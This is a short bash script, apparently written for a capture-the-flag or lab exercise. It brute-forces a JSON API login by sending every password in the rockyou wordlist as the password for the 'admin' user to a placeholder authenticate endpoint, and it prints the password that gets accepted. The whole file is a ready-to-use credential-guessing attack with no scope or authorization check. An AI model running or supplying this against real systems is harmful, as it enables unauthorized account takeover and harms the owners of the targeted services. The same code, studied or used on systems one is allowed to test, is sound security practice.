#!/bin/bash
#Goal is to make a script that will use rockyou as a password
#Meant to be used for basic authentication on json api pages
while read p; do
    echo -n $p
    response=$(curl --silent -X POST http://'address to json authenticate'/api/index.php?action=authenticate -F "username=admin" -F "password=$p" | cut -b 3-6)
    if [ "auth" == "${response}" ]; then
        echo -ne "\r$p"
        echo
        echo "The password is: $p"
        exit 1
    else
        echo -ne "\r$p <--- Password Did Not Work"
        echo
    fi
done < "/usr/share/wordlists/rockyou.txt"
